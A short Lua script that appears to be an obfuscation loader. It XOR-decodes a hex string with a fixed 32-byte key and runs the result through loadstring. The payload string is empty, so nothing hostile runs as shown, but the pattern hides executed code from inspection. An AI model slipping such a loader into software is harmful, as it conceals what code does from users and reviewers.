local k={155,246,249,116,9,9,229,230,193,150,195,23,79,20,26,130,73,220,182,254,27,24,119,227,123,50,95,107,23,122,143,158}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
